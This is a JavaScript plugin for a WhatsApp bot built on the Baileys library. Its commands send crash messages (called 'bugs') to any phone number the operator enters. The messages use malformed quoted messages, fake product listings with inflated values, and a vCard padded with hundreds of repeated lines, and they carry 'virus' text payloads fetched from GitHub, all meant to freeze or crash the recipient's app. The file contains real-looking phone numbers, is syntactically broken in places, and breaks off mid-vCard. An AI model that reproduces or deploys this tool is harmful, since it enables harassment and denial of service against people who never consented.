/*import generateWAMessageFromContent, prepareWAMessageMedia, proto from '@adiwajshing/baileys'*/
/*let { generateWAMessageFromContent, prepareWAMessageMedia, proto } = (await import('@adiwajshing/baileys')).default
import moment from 'moment-timezone'
import fetch from 'node-fetch'
import fs from 'fs'
import { sticker } from '../lib/sticker.js'
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {

if (!text)return conn.send2ButtonImg(m.chat, `https://telegra.ph/file/18e0bc2b07cadd20af38e.jpg`, `π`,`*β³πβ ππ¨π¦π¨π«π§π²π πππ§π ππ­ππ‘?ΰΏκͺΆππ―βΰΌ»*    π¦ β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  *κ§α±ββΝβ§Όπ₯ΆββwΜΜeΜΆ aΜΜrΜΆeΜΆβ§½ΝβΝ’Ν’Ϋ¦ΰ½ΌΝ’ββ’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘ α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’  α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘ βΝ’Ν’ βΝ’Ν’ β£Ν’βΝ’Ν’β¦  βΝ’Ν’Ϋ¦ΰ½ΌΝ’βΝ’Ν’α‘β  α‘βα‘β α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘,`,
     'Owner','.owner'
       'Donasi','.donasi'
       )
      
let thumb = fs.readFileSync('./media/ok.jpg')
let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
let type = (args[0] || '').toLowerCase()
const from = m.key.remoteJid
//const participants = m.isGroup ? await groupMetadata.participants : ''
let q = `Mα΄α΄α΄α΄sΚα΄\n${text}`
let sections = 
[
{
title: '  β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  *κ§α±ββΝβ§Όπ₯ΆββwΜΜeΜΆ aΜΜrΜΆeΜΆβ§½Νπ₯΅Νπ₯ββα±κ§* *ιι£ιι£ιι£ιxι£ιι£ιι£ιι£ιι* *ββ§ΌΝπ₯Άκ?κ? κ?’κ? κ?κ?κ?₯κ?’β§½ΝπΉπ₯α΄·β±βΏα΅ Κ°α΅βΏα΅α΅Κ³β...ΰΌββnΜ·wΜ·sΜ·rΜ·ΰΏβΰΌ...β* *ιι£ιι£ιι£ιι£ιι£ιι£ιι£ιι* *ΰΉΰΉΰΉ615ΰΉΰΉ* *ΰΉΰΉΰΉΰΉΰΉΰΉΰΉΰΉ* *ΰΉΰΉΰΉΰΉΰΉΰΉΰΉΰΉ*β³πΉβwΜΜeΜΆ ππππ ππ πππΜΆα­ππππΰΏπ±π°βΰΌ»*βΌοΈπππ©Έβ’ππππ£β’π©ΈππβΌοΈβ’β β’(ΰΌββ’β°ββ±β’π ππ’π¬π²ππ‘β’β£βΫβΒ°)β’β©β β’*.γ.γ.γ.γ.γ.γ.γ.γ.γ.cc* *~.1.1.5.π«.β.π―₯Ί.β.1.5.5.π«.β.8π―₯Ί.β.π«.β.1.5.6.Ψ.cc~* οΏ½*.γ.',
rows: [
{ title: 'πβπ©ππ π·ππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} pdf ${text}` },
{ title: 'πβπ©ππ πͺπππππΜΆΜΆΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} bugcatalog ${text}` },
{ title: 'πβπ©ππ π½πΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} vn ${text}` },
{ title: 'πβπ©ππ πΊππππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} sticker ${text}` },
{ title: 'πβπ©ππ π°ππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} bugimg ${text}` },
{ title: 'πβπ©ππ π½ππππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} bugvid ${text}` },
 title: 'πβπ©ππ π°πππππΰΏκͺΆπ', rowId: `${_p}${command} buginvite ${text}` },
{ title: 'πβπ©ππ πͺππππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} bugcrash ${text}` },
{ title: 'πβπ©ππ π²πππππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} bugkontak ${text}` }, 
{ title: 'πβπ©ππ πΉπππππ·πΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} reactpc ${text}` },        
{ title: 'πβπ©ππ π»πππ πͺππππΜΆα­ΰΏκͺΆπ', rowId: `${_p}${command} bugtextcrash ${text}` },]}]
    let listMessage = {
      text: 'πβππππΜΆα­ππππππα­ΰΏκͺΆπ',
      footer: '*β³πββwΜΜeΜΆ ππππΜΆα­ππππππΰΏκͺΆππ―βΰΌ»*    π¦ β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  *κ§α±ββΝβ§Όπ₯ΆββwΜΜeΜΆ aΜΜrΜΆeΜΆβ§½Νπ₯΅Νπ₯ββα±κ§* *ιι£ιι£ιι£ιxι£ιι£ιι£ιι£ιι* *ββ§ΌΝπ₯Άκ?κ? κ?’κ? κ?κ?κ?₯κ?’β§½ΝπΉπ₯α΄·β±βΏα΅ Κ°α΅βΏα΅α΅Κ³β...ΰΌββnΜ·wΜ·sΜ·rΜ·ΰΏβΰΌ...β* *ιι£ιι£ιι£ιι£ιι£ιι£ιι£ιι* *ΰΉΰΉΰΉ615ΰΉΰΉ* *ΰΉΰΉΰΉΰΉΰΉΰΉΰΉΰΉ* *ΰΉΰΉΰΉΰΉΰΉΰΉΰΉΰΉ*β³πΉβwΜΜeΜΆ ππππ ππ πππΜΆα­ππππΰΏπ±π°βΰΌ»*βΌοΈπππ©Έβ’ππππ£β’π©ΈππβΌοΈβ’β β’(ΰΌββ’β°ββ±β’π ππ’π¬π²ππ‘β’β£βΫβΒ°)β’β©β β’*.γ.γ.γ.γ.γ.γ.γ.γ.γ.cc* *~.1.1.5.π«.β.π―₯Ί.β.1.5.5.π«.β.8π―₯Ί.β.π«.β.1.5.6.Ψ.cc~* οΏ½*.γ.γ.γ.γ.γ.γ.γ.γ.γ.cc* *~.1.1.5.π«.β.π―₯Ί.β.1.5.5.π«.β.π―₯Ί.β.π«.β.1.5.6.Ψ.cc~* Β Β Β Ϋ¦ΰ½ΌΝ’β βΝ’Ν’Ϋ¦ΰ½ΌΝ’ββ’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘ α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘ βΝ’Ν’ βΝ’Ν’ β£Ν’βΝ’Ν’β¦  βΝ’Ν’Ϋ¦ΰ½ΌΝ’βΝ’Ν’α‘β  α‘βα‘β α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘',
      buttonText: 'π₯Άβα‘β’ββ’α‘β’α‘β’α‘β’α‘  π«πΊΜΆΜΆπ°π΅ΜΆπ°ΜΆ πΊπΜΆπΜΆπΜΆβ§½ΝΜΆΜΆπ₯΅ΝΜΆπ₯ΜΆ',
      sections
      }

//==================( Quoted ) =================//
const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "ALDI GANZ",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": fs.readFileSync('./media/ok.jpg'),
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
//# Kal
const kal = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": `${wm}`,
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "@s.whatsapp.net"
	}}}}	
//=================================================//		
//# Troli
const trol = { 
key: {
fromMe: false, 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
},
"message": {
"orderMessage": {
						"orderId": "594071395007984",
						"thumbnail": fs.readFileSync('./media/ok.jpg'),
						"itemCount": 100000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "",
						"orderTitle": `${wm}`,
						"sellerJid": "62857887347569@s.whatsapp.net",
						"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
						"totalAmount1000": "500000000000000",
						"totalCurrencyCode": "IDR"
	}}}
//#Troli 2
const ftrolii ={key: {fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "@g.us"},
"message": {orderMessage: 
{itemCount: 100000000000,
status: 200, 
thumbnail: thumb, 
surface: 200, 
message: `Β© ${wm}`,
token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
totalAmount1000: "500000000000000",
totalCurrencyCode: "IDR",
orderTitle: `${wm} ${virus2}`,
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {"forwardingScore":999,"isForwarded":true},
sendEphemeral: true}	
//=================================================//	
// doc
/*const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `HW MODS WA${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
//# Sticker
const bugstik = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./media/ok.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${wm}`,
"orderTitle": `${wm}`,
"sellerJid": "62857887347569@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
            } 
        }}
//=================================================//
//# Pdf
const bugpdf = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `${wm}`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
//=================================================//   
//# Vn
const adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
"locationMessage": {}
            } 
        } 
//=================================================//       
//# Image
const bugimage = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `${wm}`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
//=================================================//        
const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ok.jpg') }, { upload: conn.waUploadToServer })
const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${wm}`,
"description": `${virus2}`,
"currencyCode": "IDR",
"bodyText": `${virus}`,
"footerText": `${wm}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `${wm}`,
"url": "wa.me/62881037044211"
},
"businessOwnerJid": "62881037044211@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })    
//=================================================//    
//# Contact
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wm}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${wm}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
//=================================================//   
//# Text
const main = {
  "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
  },
  "message":{
"imageMessage":{
  "mimetype":"image/jpeg",
  "jpegThumbnail":fs.readFileSync('./media/ok.jpg')
}
  }
}
//=================================================//   
   
switch (type) {

case 'vn': {
 conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'pdf': {
 conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`ππ§ΉΝΝΝ‘Νπ΄Ν‘Νπ¨Ν‘Ν?π΄Ν‘Νπ¨Ν‘Ν?πͺΝ‘ΝπΆΝ‘Νπ§ΉΝΝσ π₯.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'sticker': {
let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'bugimg': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
}
break
case 'bugcrash': {
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)

}
break
case 'bugkontak': {
let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
"contactMessage": {
"vcard": "HAHaAhHAHAHA",
"displayName": `HyzerDev`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: fkontaak, contextInfo:{}}) 
conn.relayWAMessage(res)
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'reactpc': {
await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${wm}` }, {quoted: trol})
//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'bugtag': {
if (!m.isGroup) return global.dfail('group',m,conn)
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
}
break
case 'bugcatalog': {
conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
}
break
case 'bugtextcrash': {
conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${wm}`, main)
}
break
case 'bugvid': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})
}
break
case 'buglist':{
sections = [
{
title: `Fixed\n${virus}`,
 rows: [
{title: virus, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`},
{title: virus2, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`},
{title: virus, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`}
]}]
let listMessage = {
      text: `Halo Bang\n${virus}`,
      footer: wm,
      buttonText: `π₯Άβα‘β’ββ’α‘β’α‘β’α‘β’α‘  Klick Ini Bozβ§½ΝΜΆΜΆπ₯΅ΝΜΆπ₯\n-${virus2}ΜΆ`,
      sections
      }
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', listMessage, {quoted: fkontak})

jobotz.sendListMsg(m.chat, `Script Di List\n${philips}`, jobotz.user.name, `THE JO BOT`, `THE JO BOT\n-${job`, des, shield2)
}
break
case 'buginvite': {
let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `Β© THE JO BOT${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE JO BOT\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 